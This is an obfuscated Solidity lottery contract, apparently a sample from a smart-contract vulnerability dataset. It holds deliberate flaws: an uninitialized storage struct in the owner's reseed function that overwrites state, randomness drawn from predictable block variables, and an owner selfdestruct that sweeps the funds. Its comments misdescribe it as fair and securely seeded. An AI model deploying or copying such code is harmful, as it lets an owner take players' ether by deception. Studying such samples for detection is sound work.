contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x13fb26;
        uint _0x53c95b;
        uint _0xd97cb0;
        uint _0x78a4fd;
    }

    address _0xab5bd8; //address of the owner
    uint private _0xfa0b39; //seed used to calculate number of an address
    uint private _0x7feba3; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0xacd542; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0xab5bd8 = msg.sender;
        _0x3f101f(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x960c87() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0xacd542[msg.sender] == false);

        if(_0xba63cb(msg.sender) == LuckyNumber){ //check if it equals 7
            _0xacd542[msg.sender] = true; // every address can only win once

            uint _0x09bbf9=msg.value*7; //win = 7 times the ticket price

            if(_0x09bbf9>this.balance) //if the balance isnt sufficient...
                _0x09bbf9=this.balance; //...send everything we've got
            msg.sender.transfer(_0x09bbf9);
        }

        if(block.number-_0x7feba3>1000) //reseed if needed
            _0x3f101f(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xba63cb(address _0x8a9fa0) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x4b7c3b(uint(_0x8a9fa0), _0xfa0b39)[0]) % 8;
    }

    function _0x3f101f(SeedComponents _0x45a4a9) internal {
        if (false) { revert(); }
        uint256 _unused2 = 0;
        _0xfa0b39 = uint256(_0x4b7c3b(
            _0x45a4a9._0x13fb26,
            _0x45a4a9._0x53c95b,
            _0x45a4a9._0xd97cb0,
            _0x45a4a9._0x78a4fd
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0x7feba3 = block.number;
    }

    function _0xb31b36() {
        require(msg.sender==_0xab5bd8);

        selfdestruct(msg.sender);
    }

    function _0x26a8fc() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0xab5bd8);

        SeedComponents s;
        s._0x13fb26 = uint(msg.sender);
        s._0x53c95b = uint256(block.blockhash(block.number - 1));
        s._0xd97cb0 = block.difficulty*(uint)(block.coinbase);
        s._0x78a4fd = tx.gasprice * 7;

        _0x3f101f(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0xab5bd8) //owner can't participate, he can only fund the jackpot
            _0x960c87();
    }

}
